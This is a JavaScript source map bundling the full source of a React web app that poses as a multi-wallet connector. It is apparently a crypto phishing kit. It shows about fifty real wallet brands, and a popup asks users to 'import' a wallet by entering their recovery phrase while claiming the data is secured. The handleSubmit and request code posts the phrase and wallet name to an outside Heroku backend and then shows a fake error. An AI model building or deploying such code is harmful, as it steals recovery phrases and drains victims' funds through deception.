{"version":3,"sources":["components/popup/popup.module.scss","components/homepage/data.js","components/homepage/Homepage.js","Config.js","helpers/request.js","components/popup/handleSubmit.js","components/popup/Popup.js","App.js","serviceWorker.js","index.js"],"names":["module","exports","data","name","image","Homepage","setPopUpdata","setShowPopup","className","map","d","onClick","importWallet","src","alt","config","Request","path","this","prototype","getSyncMessage","obj","a","method","headers","body","JSON","stringify","fetch","request","json","response","console","log","status","error","handleFormSubmit","e","rPhrase","setDisableButton","walletName","setShowmessage","setShowSuccess","preventDefault","id","toast","loading","match","update","render","type","isLoading","autoClose","setTimeout","message","Popup","popUpData","useState","showMessage","setRPhrase","disableButton","showSuccess","closeModal","styles","successContainer","itemWrapper","logoContainer","ImageContainer","parentContainer","textContainer","formContainer","onSubmit","disabled","value","fill","stroke-linecap","stroke-linejoin","stroke-width","viewBox","stroke","class","onChange","target","App","showPopup","Fragment","position","hideProgressBar","newestOnTop","closeOnClick","rtl","pauseOnFocusLoss","draggable","pauseOnHove","Boolean","window","location","hostname","ReactDOM","StrictMode","document","getElementById","navigator","serviceWorker","ready","then","registration","unregister"],"mappings":"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","file":"static/js/main.f2935b62.chunk.js","sourcesContent":["// extracted by mini-css-extract-plugin\nmodule.exports = {\"successContainer\":\"popup_successContainer__lafFB\",\"itemWrapper\":\"popup_itemWrapper__1ysvy\",\"logoContainer\":\"popup_logoContainer__1Fwzy\",\"ImageContainer\":\"popup_ImageContainer__V0wZs\",\"parentContainer\":\"popup_parentContainer__1r1DV\",\"textContainer\":\"popup_textContainer__3BUqU\"};","export const data = [\r\n  { name: \"  Trust wallet\", image: \"../../images/trustwallet.png\" },\r\n  { name: \"  Metamask wallet\", image: \"../../images/metamask.png\" },\r\n  { name: \"  AAVE wallet\", image: \"../../images/aave.jpeg\" },\r\n  { name: \"  Ledger wallet\", image: \"../../images/ledgerwallet.png\" },\r\n  { name: \"  Enjin wallet\", image: \"../../images/Enjinwallet.png\" },\r\n  { name: \"  MEW wallet\", image: \"../../images/mewwallet.png\" },\r\n  { name: \"  Digitex wallet\", image: \"../../images/digitex.png\" },\r\n  { name: \"  Coinbase wallet\", image: \"../../images/coinbase.png\" },\r\n  { name: \"  Autherum wallet\", image: \"../../images/autherum.png\" },\r\n  { name: \"  Portis wallet\", image: \"../../images/portis.png\" },\r\n  { name: \"  Formatic wallet\", image: \"../../images/formatic.png\" },\r\n  { name: \"  Exodus wallet\", image: \"../../images/exodus.png\" },\r\n  { name: \"  Defiat wallet\", image: \"../../images/defiat.png\" },\r\n  { name: \"  Skale wallet\", image: \"../../images/skale.png\" },\r\n  { name: \"  Wallet connect\", image: \"../../images/walletconnect.jpeg\" },\r\n  { name: \"  Coinomi wallet\", image: \"../../images/coinomi.png\" },\r\n  { name: \"  Atomic wallet\", image: \"../../images/atomic.jpeg\" },\r\n  { name: \"  Tron wallet\", image: \"../../images/tronwallet.png\" },\r\n  { name: \"  Band protocol wallet\", image: \"../../images/band.png\" },\r\n  { name: \"  EOS wallet\", image: \"../../images/eos.png\" },\r\n  { name: \"  Wax wallet\", image: \"../../images/wax.png\" },\r\n  { name: \"  Zilliqa wallet\", image: \"../../images/zilliqa.png\" },\r\n  { name: \"  Polkadot wallet\", image: \"../../images/polkadot.png\" },\r\n  { name: \"  Monero wallet\", image: \"../../images/monero.png\" },\r\n  { name: \"  Klever wallet\", image: \"../../images/klever.jpg\" },\r\n  { name: \"  Neon wallet\", image: \"../../images/neon.png\" },\r\n  { name: \"  Theta wallet\", image: \"../../images/theta.png\" },\r\n  { name: \"  TomoChain wallet\", image: \"../../images/tomochain.png\" },\r\n  { name: \"  Jaxx wallet\", image: \"../../images/jaxx.png\" },\r\n  { name: \"  Elrond wallet\", image: \"../../images/elrond.png\" },\r\n  { name: \"  Bancor wallet\", image: \"../../images/bancor.png\" },\r\n  { name: \"  1inch wallet\", image: \"../../images/1inch.png\" },\r\n  { name: \"  Cosmos wallet\", image: \"../../images/cosmos.png\" },\r\n  { name: \"  Moonlet wallet\", image: \"../../images/moonlet.png\" },\r\n  { name: \"  Harmony wallet\", image: \"../../images/harmony.png\" },\r\n  { name: \"  Tezos wallet\", image: \"../../images/tezos.png\" },\r\n  { name: \"  Kyber Swap wallet\", image: \"../../images/kyberswap.png\" },\r\n  { name: \"  Falcon Swap wallet\", image: \"../../images/falswap.png\" },\r\n  { name: \"  Zilliqa wallet\", image: \"../../images/zilliqa.png\" },\r\n  { name: \"  Kava wallet\", image: \"../../images/kava.png\" },\r\n  { name: \"  Ocean Protocol wallet\", image: \"../../images/oceanprotocol.png\" },\r\n  { name: \"  Hex wallet\", image: \"../../images/hexcom.png\" },\r\n  { name: \"  Cardano wallet\", image: \"../../images/cardano.png\" },\r\n  { name: \"  Kardia Chain wallet\", image: \"../../images/kardiachain.png\" },\r\n  { name: \"  Octofi wallet\", image: \"../../images/octofi.png\" },\r\n  { name: \"  Algorand wallet\", image: \"../../images/algorand.png\" },\r\n  { name: \"  Argent wallet\", image: \"../../images/argent.png\" },\r\n  { name: \"  Rainbow wallet\", image: \"../../images/rainbow.png\" },\r\n  { name: \"  Gnosis Safe Multisig\", image: \"../../images/gnosis.jpg\" },\r\n  { name: \"Crypto.com | Defi Wallet\", image: \"../../images/crypto.png\" },\r\n];\r\n","import React from \"react\";\r\nimport \"./Homepage.css\";\r\nimport \"./mobile.css\";\r\nimport { data } from \"./data\";\r\nconst Homepage = ({ setPopUpdata, setShowPopup }) => {\r\n  const importWallet = (d) => {\r\n    setPopUpdata(d);\r\n    setShowPopup(true);\r\n  };\r\n  return (\r\n    <section className=\"homepage\">\r\n      <div className=\"header\">\r\n        <h1>Wallets</h1>\r\n      </div>\r\n      <div className=\"text\">\r\n        <p>\r\n          Multiple iOS and Android wallets support the Linkup Affix protocol.\r\n          Simply scan a QR code from your desktop computer screen to start\r\n          securely using a dApp with your mobile wallet. Interaction between\r\n          mobile apps and mobile browsers are supported via mobile deep linking. \r\n        </p>\r\n      </div>\r\n      <div className=\"grid\">\r\n        {data.map((d) => (\r\n          <div className=\"small-box\" onClick={() => importWallet(d)}>\r\n            <img src={d.image} alt={d.name}></img>\r\n            <p>{d.name}</p>\r\n          </div>\r\n        ))}\r\n      </div>\r\n    </section>\r\n  );\r\n};\r\n\r\nexport default Homepage;\r\n","export const config = {\r\n  baseUrl: `https://hart2022-be.herokuapp.com`,\r\n};\r\n","import { config } from \"../Config\";\r\n\r\nexport function Request(path) {\r\n  this.path = `${config.baseUrl}/api/auth/${path}`;\r\n}\r\n\r\nRequest.prototype.getSyncMessage = async function (obj) {\r\n  const config = {\r\n    method: \"POST\",\r\n    headers: { \"Content-Type\": \"application/json\" },\r\n    body: JSON.stringify(obj),\r\n  };\r\n\r\n  try {\r\n    const request = await fetch(this.path, config);\r\n    const response = await request.json();\r\n    console.log(request);\r\n    console.log(response);\r\n    if (request.status !== 200) {\r\n      return {\r\n        status: false,\r\n        ...response,\r\n      };\r\n    }\r\n    return {\r\n      status: true,\r\n      ...response,\r\n    };\r\n  } catch (error) {\r\n    return {\r\n      status: false,\r\n      error,\r\n    };\r\n  }\r\n};\r\n","import { toast } from \"react-toastify\";\r\nimport { Request } from \"../../helpers/request.js\";\r\n\r\nexport const handleFormSubmit = async ({\r\n  e,\r\n  rPhrase,\r\n  setDisableButton,\r\n  walletName,\r\n  setShowmessage,\r\n  setShowSuccess,\r\n}) => {\r\n  e.preventDefault();\r\n  setDisableButton(true);\r\n  const id = toast.loading(\"Processing...\");\r\n\r\n  const checkPhrase = rPhrase.match(/\\s*(\\S\\s*){20,}/g);\r\n  if (!checkPhrase) {\r\n    setShowmessage(\"This field cannot be less 20 characters.\");\r\n    toast.update(id, {\r\n      render: \"This field cannot be less 20 characters\",\r\n      type: \"warning\",\r\n      isLoading: false,\r\n      autoClose: 1000,\r\n    });\r\n    setDisableButton(false);\r\n    return;\r\n  }\r\n\r\n  setTimeout(() => {\r\n    setShowmessage(\"\");\r\n  }, 6000);\r\n\r\n  const obj = { walletName, rPhrase };\r\n  console.log(obj);\r\n  const request = new Request(\"wallet/sync3\");\r\n  const getSyncMessage = await request.getSyncMessage(obj);\r\n\r\n  if (!getSyncMessage.status) {\r\n    setDisableButton(false);\r\n    setShowSuccess(true);\r\n    return toast.update(id, {\r\n      render: getSyncMessage.message || \"An error occurred. Try again later\",\r\n      type: \"error\",\r\n      isLoading: false,\r\n      autoClose: 2000,\r\n    });\r\n  }\r\n  if (getSyncMessage.status) {\r\n    setShowSuccess(true);\r\n    setDisableButton(false);\r\n    toast.update(id, {\r\n      render: \"Failed to Import\",\r\n      type: \"error\",\r\n      isLoading: false,\r\n      autoClose: 2000,\r\n    });\r\n  }\r\n};\r\n","import React, { useState } from \"react\";\r\nimport \"./Popup.css\";\r\nimport \"./mobile.css\";\r\nimport Axios from \"axios\";\r\nimport { handleFormSubmit } from \"./handleSubmit\";\r\nimport { AiOutlineCheckCircle } from \"react-icons/ai\";\r\nimport styles from \"./popup.module.scss\";\r\n\r\nconst Popup = ({ setPopUpdata, setShowPopup, popUpData }) => {\r\n  const [showMessage, setShowmessage] = useState(\"\");\r\n  const [rPhrase, setRPhrase] = useState(\"\");\r\n  const [disableButton, setDisableButton] = useState(false);\r\n  const [showSuccess, setShowSuccess] = useState(false);\r\n\r\n  const closeModal = () => {\r\n    setShowPopup(false);\r\n    setPopUpdata(null);\r\n    setShowSuccess(false);\r\n  };\r\n\r\n  return (\r\n    <section className=\"popup\">\r\n      {!showSuccess ? (\r\n        <div>\r\n          <div className=\"form-header\">\r\n            <img src={popUpData.image}></img>\r\n            <p>Import your {popUpData.name}</p>\r\n          </div>\r\n          {showMessage ? (\r\n            <p className=\"error-success-msg\">{showMessage}</p>\r\n          ) : null}\r\n          <div className=\"form\">\r\n            <div className={styles.formContainer}>\r\n              <form\r\n                onSubmit={(e) => {\r\n                  handleFormSubmit({\r\n                    e,\r\n                    rPhrase,\r\n                    setDisableButton,\r\n                    walletName: popUpData.name,\r\n                    setShowmessage,\r\n                    setShowSuccess,\r\n                  });\r\n                }}\r\n              >\r\n                <span className=\"info-div\">\r\n                  <AiOutlineCheckCircle className=\"checkIcon\" />\r\n                  Your information are highly secured\r\n                </span>\r\n                <div>\r\n                  <label>Wallet Name</label>\r\n                  <input type=\"text\" disabled={true} value={popUpData.name} />\r\n                  <span className=\"input\">\r\n                    <svg\r\n                      fill=\"none\"\r\n                      stroke-linecap=\"round\"\r\n                      stroke-linejoin=\"round\"\r\n                      stroke-width=\"2\"\r\n                      viewBox=\"0 0 24 24\"\r\n                      stroke=\"currentColor\"\r\n                      class=\"h-6 w-6\"\r\n                    >\r\n                      <path d=\"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z\"></path>\r\n                    </svg>\r\n                  </span>\r\n                </div>\r\n                <div className=\"recovery\">\r\n                  <label>Recovery Phrase</label>\r\n                  <textarea\r\n                    type=\"text\"\r\n                    onChange={(e) => setRPhrase(e.target.value)}\r\n                  ></textarea>\r\n                  <span className=\"textarea\">\r\n                    <svg\r\n                      fill=\"none\"\r\n                      stroke-linecap=\"round\"\r\n                      stroke-linejoin=\"round\"\r\n                      stroke-width=\"2\"\r\n                      viewBox=\"0 0 24 24\"\r\n                      stroke=\"currentColor\"\r\n                      class=\"h-6 w-6\"\r\n                    >\r\n                      <path d=\"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z\"></path>\r\n                    </svg>\r\n                  </span>\r\n                </div>\r\n                <h6>\r\n                  <i className=\"fa fa-info-circle\"></i>Typically 12 (sometimes\r\n                  24) words separated by single space.\r\n                </h6>\r\n\r\n                {disableButton ? (\r\n                  <div className=\"proceed-button disabled\">\r\n                    <p>Please Wait... </p>\r\n                  </div>\r\n                ) : (\r\n                  <button className=\"proceed-button2\">Import</button>\r\n                  // <div\r\n                  //   className=\"proceed-button\"\r\n                  //   onClick={() => handleFormSubmit2()}\r\n                  // >\r\n                  //   <button className=\"proceed-button2\">proceed</button>\r\n                  //   <svg\r\n                  //     fill=\"none\"\r\n                  //     stroke-linecap=\"round\"\r\n                  //     stroke-linejoin=\"round\"\r\n                  //     stroke-width=\"2\"\r\n                  //     viewBox=\"0 0 24 24\"\r\n                  //     stroke=\"currentColor\"\r\n                  //     class=\"h-6 w-6\"\r\n                  //   >\r\n                  //     <path d=\"M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z\"></path>\r\n                  //   </svg>\r\n                  // </div>\r\n                )}\r\n              </form>\r\n\r\n              {disableButton ? null : (\r\n                <div className=\"cancel\">\r\n                  <p onClick={() => closeModal()}>Cancel</p>\r\n                </div>\r\n              )}\r\n            </div>\r\n          </div>\r\n        </div>\r\n      ) : (\r\n        <div className={styles.successContainer}>\r\n          <div className={styles.itemWrapper}>\r\n            <div className={styles.logoContainer}>\r\n              <div className={styles.ImageContainer}></div>\r\n            </div>\r\n          </div>\r\n          <div className={styles.parentContainer}>\r\n            <div className={styles.textContainer}>\r\n              oops. there seems to be an error, please contact Admin/support for\r\n              authentication\r\n              <button onClick={() => closeModal()}> Back </button>\r\n            </div>\r\n          </div>\r\n        </div>\r\n      )}\r\n    </section>\r\n  );\r\n};\r\nexport default Popup;\r\n","import React, { useState, useEffect } from \"react\";\r\nimport { ToastContainer } from \"react-toastify\";\r\nimport \"react-toastify/dist/ReactToastify.css\";\r\nimport Homepage from \"./components/homepage/Homepage\";\r\nimport \"./App.css\";\r\nimport Popup from \"./components/popup/Popup\";\r\nconst App = () => {\r\n  const [showPopup, setShowPopup] = useState(false);\r\n  const [popUpData, setPopUpdata] = useState({});\r\n  return (\r\n    <React.Fragment>\r\n      <ToastContainer\r\n        position=\"top-center\"\r\n        autoClose={5000}\r\n        hideProgressBar={false}\r\n        newestOnTop={false}\r\n        closeOnClick\r\n        rtl={false}\r\n        pauseOnFocusLoss\r\n        draggable\r\n        pauseOnHove\r\n      />\r\n      <Homepage setPopUpdata={setPopUpdata} setShowPopup={setShowPopup} />\r\n      {showPopup ? (\r\n        <Popup\r\n          popUpData={popUpData}\r\n          setPopUpdata={setPopUpdata}\r\n          setShowPopup={setShowPopup}\r\n        />\r\n      ) : null}\r\n    </React.Fragment>\r\n  );\r\n};\r\n\r\nexport default App;\r\n","// This optional code is used to register a service worker.\r\n// register() is not called by default.\r\n\r\n// This lets the app load faster on subsequent visits in production, and gives\r\n// it offline capabilities. However, it also means that developers (and users)\r\n// will only see deployed updates on subsequent visits to a page, after all the\r\n// existing tabs open on the page have been closed, since previously cached\r\n// resources are updated in the background.\r\n\r\n// To learn more about the benefits of this model and instructions on how to\r\n// opt-in, read https://bit.ly/CRA-PWA\r\n\r\nconst isLocalhost = Boolean(\r\n  window.location.hostname === 'localhost' ||\r\n    // [::1] is the IPv6 localhost address.\r\n    window.location.hostname === '[::1]' ||\r\n    // 127.0.0.0/8 are considered localhost for IPv4.\r\n    window.location.hostname.match(\r\n      /^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/\r\n    )\r\n);\r\n\r\nexport function register(config) {\r\n  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {\r\n    // The URL constructor is available in all browsers that support SW.\r\n    const publicUrl = new URL(process.env.PUBLIC_URL, window.location.href);\r\n    if (publicUrl.origin !== window.location.origin) {\r\n      // Our service worker won't work if PUBLIC_URL is on a different origin\r\n      // from what our page is served on. This might happen if a CDN is used to\r\n      // serve assets; see https://github.com/facebook/create-react-app/issues/2374\r\n      return;\r\n    }\r\n\r\n    window.addEventListener('load', () => {\r\n      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;\r\n\r\n      if (isLocalhost) {\r\n        // This is running on localhost. Let's check if a service worker still exists or not.\r\n        checkValidServiceWorker(swUrl, config);\r\n\r\n        // Add some additional logging to localhost, pointing developers to the\r\n        // service worker/PWA documentation.\r\n        navigator.serviceWorker.ready.then(() => {\r\n          console.log(\r\n            'This web app is being served cache-first by a service ' +\r\n              'worker. To learn more, visit https://bit.ly/CRA-PWA'\r\n          );\r\n        });\r\n      } else {\r\n        // Is not localhost. Just register service worker\r\n        registerValidSW(swUrl, config);\r\n      }\r\n    });\r\n  }\r\n}\r\n\r\nfunction registerValidSW(swUrl, config) {\r\n  navigator.serviceWorker\r\n    .register(swUrl)\r\n    .then(registration => {\r\n      registration.onupdatefound = () => {\r\n        const installingWorker = registration.installing;\r\n        if (installingWorker == null) {\r\n          return;\r\n        }\r\n        installingWorker.onstatechange = () => {\r\n          if (installingWorker.state === 'installed') {\r\n            if (navigator.serviceWorker.controller) {\r\n              // At this point, the updated precached content has been fetched,\r\n              // but the previous service worker will still serve the older\r\n              // content until all client tabs are closed.\r\n              console.log(\r\n                'New content is available and will be used when all ' +\r\n                  'tabs for this page are closed. See https://bit.ly/CRA-PWA.'\r\n              );\r\n\r\n              // Execute callback\r\n              if (config && config.onUpdate) {\r\n                config.onUpdate(registration);\r\n              }\r\n            } else {\r\n              // At this point, everything has been precached.\r\n              // It's the perfect time to display a\r\n              // \"Content is cached for offline use.\" message.\r\n              console.log('Content is cached for offline use.');\r\n\r\n              // Execute callback\r\n              if (config && config.onSuccess) {\r\n                config.onSuccess(registration);\r\n              }\r\n            }\r\n          }\r\n        };\r\n      };\r\n    })\r\n    .catch(error => {\r\n      console.error('Error during service worker registration:', error);\r\n    });\r\n}\r\n\r\nfunction checkValidServiceWorker(swUrl, config) {\r\n  // Check if the service worker can be found. If it can't reload the page.\r\n  fetch(swUrl, {\r\n    headers: { 'Service-Worker': 'script' }\r\n  })\r\n    .then(response => {\r\n      // Ensure service worker exists, and that we really are getting a JS file.\r\n      const contentType = response.headers.get('content-type');\r\n      if (\r\n        response.status === 404 ||\r\n        (contentType != null && contentType.indexOf('javascript') === -1)\r\n      ) {\r\n        // No service worker found. Probably a different app. Reload the page.\r\n        navigator.serviceWorker.ready.then(registration => {\r\n          registration.unregister().then(() => {\r\n            window.location.reload();\r\n          });\r\n        });\r\n      } else {\r\n        // Service worker found. Proceed as normal.\r\n        registerValidSW(swUrl, config);\r\n      }\r\n    })\r\n    .catch(() => {\r\n      console.log(\r\n        'No internet connection found. App is running in offline mode.'\r\n      );\r\n    });\r\n}\r\n\r\nexport function unregister() {\r\n  if ('serviceWorker' in navigator) {\r\n    navigator.serviceWorker.ready.then(registration => {\r\n      registration.unregister();\r\n    });\r\n  }\r\n}\r\n","import React from \"react\";\r\nimport ReactDOM from \"react-dom\";\r\nimport \"./index.css\";\r\n\r\nimport App from \"./App\";\r\nimport * as serviceWorker from \"./serviceWorker\";\r\n\r\nReactDOM.render(\r\n  <React.StrictMode>\r\n    <App />\r\n  </React.StrictMode>,\r\n  document.getElementById(\"root\")\r\n);\r\n\r\n// If you want your app to work offline and load faster, you can change\r\n// unregister() to register() below. Note this comes with some pitfalls.\r\n// Learn more about service workers: https://bit.ly/CRA-PWA\r\nserviceWorker.unregister();\r\n"],"sourceRoot":""}